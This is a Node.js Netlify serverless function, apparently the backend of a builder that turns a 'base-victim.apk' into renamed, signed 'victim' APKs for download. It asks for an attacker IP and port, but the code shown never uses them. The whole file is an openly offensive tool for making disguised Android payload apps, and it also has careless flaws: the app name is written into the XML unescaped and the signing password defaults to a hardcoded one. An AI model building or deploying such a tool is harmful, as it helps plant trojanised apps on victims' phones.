// netlify/functions/server.js

import express from "express";
import serverless from "serverless-http";
import cors from "cors";
import multer from "multer";
import fs from "fs";
import path from "path";
import AdmZip from "adm-zip";
import { exec } from "child_process";

const app = express();

// Enable CORS if needed
app.use(cors());
app.use(express.json({ limit: "100mb" }));

// Configure multer for file uploads
const upload = multer();

// Paths and keystore settings
const BASE_APK_PATH   = path.join(__dirname, "../../base-victim.apk");
const OUTPUT_DIR      = path.join(__dirname, "../../output_apks");
const UPLOADS_DIR     = path.join(__dirname, "../../uploads");
const KEYSTORE_PATH   = path.join(__dirname, "../../keystore.jks");

const KEYSTORE_PASSWORD = process.env.KEYSTORE_PASSWORD || "password123";
const KEY_ALIAS         = process.env.KEY_ALIAS         || "mykey";
const KEY_PASSWORD      = process.env.KEY_PASSWORD      || "password123";

// Ensure output directories exist
if (!fs.existsSync(OUTPUT_DIR)) fs.mkdirSync(OUTPUT_DIR, { recursive: true });
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR, { recursive: true });


// Health check
app.get("/", (req, res) => {
  res.json({
    status: "APK Builder Live",
    baseApk: fs.existsSync(BASE_APK_PATH),
  });
});


// Main build endpoint
app.post(
  "/build-apk",
  upload.single("iconFile"),
  async (req, res) => {
    try {
      const { appName, attackerIp, attackerPort, backendUrl, packageName } =
        req.body;
      if (!appName || !attackerIp || !attackerPort) {
        return res.status(400).json({ error: "Missing fields" });
      }

      const buildId = Date.now() + "_" + Math.floor(Math.random() * 10000);
      const tempDir = path.join(OUTPUT_DIR, `temp_${buildId}`);
      const unsignedApk = path.join(OUTPUT_DIR, `unsigned_${buildId}.apk`);
      const signedApk   = path.join(OUTPUT_DIR, `victim_${buildId}.apk`);

      // Extract base APK
      const zip = new AdmZip(BASE_APK_PATH);
      zip.extractAllTo(tempDir, true);

      // Update strings.xml if present
      const stringsXml = path.join(tempDir, "res", "values", "strings.xml");
      if (fs.existsSync(stringsXml)) {
        let xml = fs.readFileSync(stringsXml, "utf8");
        xml = xml.replace(
          /<string name="app_name">[^<]*<\/string>/,
          `<string name="app_name">${appName}</string>`
        );
        fs.writeFileSync(stringsXml, xml, "utf8");
      }

      // Repack APK
      const newZip = new AdmZip();
      (function addFolder(zipper, folder, base = "") {
        fs.readdirSync(folder).forEach((item) => {
          const fullPath = path.join(folder, item);
          const relPath  = base ? `${base}/${item}` : item;
          if (fs.lstatSync(fullPath).isDirectory()) {
            addFolder(zipper, fullPath, relPath);
          } else {
            zipper.addLocalFile(fullPath, base);
          }
        });
      })(newZip, tempDir);

      newZip.writeZip(unsignedApk);

      // Sign APK if keystore exists
      let finalApk = unsignedApk;
      if (fs.existsSync(KEYSTORE_PATH)) {
        await signApk(unsignedApk, signedApk);
        finalApk = signedApk;
      }

      // Clean up
      fs.rmSync(tempDir, { recursive: true, force: true });

      res.json({
        success: true,
        downloadUrl: `/download/${buildId}`,
        signed: fs.existsSync(KEYSTORE_PATH),
        message: "APK built and ready",
      });
    } catch (err) {
      console.error(err);
      res.status(500).json({ error: err.message });
    }
  }
);


// Download endpoint
app.get("/download/:buildId", (req, res) => {
  const { buildId } = req.params;
  const signedPath   = path.join(OUTPUT_DIR, `victim_${buildId}.apk`);
  const unsignedPath = path.join(OUTPUT_DIR, `unsigned_${buildId}.apk`);
  const apkPath      = fs.existsSync(signedPath) ? signedPath : unsignedPath;

  if (!fs.existsSync(apkPath)) {
    return res.status(404).json({ error: "APK not found" });
  }

  res.download(apkPath, (err) => {
    if (!err) {
      // Remove after 5 minutes
      setTimeout(() => fs.unlinkSync(apkPath), 5 * 60 * 1000);
    }
  });
});


// Helper: sign APK
function signApk(input, output) {
  return new Promise((resolve, reject) => {
    const cmd = `jarsigner -verbose -keystore "${KEYSTORE_PATH}" \
-storepass "${KEYSTORE_PASSWORD}" -keypass "${KEY_PASSWORD}" \
-signedjar "${output}" "${input}" "${KEY_ALIAS}"`;
    exec(cmd, (err, stdout, stderr) => {
      if (err) return reject(new Error(stderr));
      resolve(stdout);
    });
  });
}


// Export Netlify handler
export const handler = serverless(app);
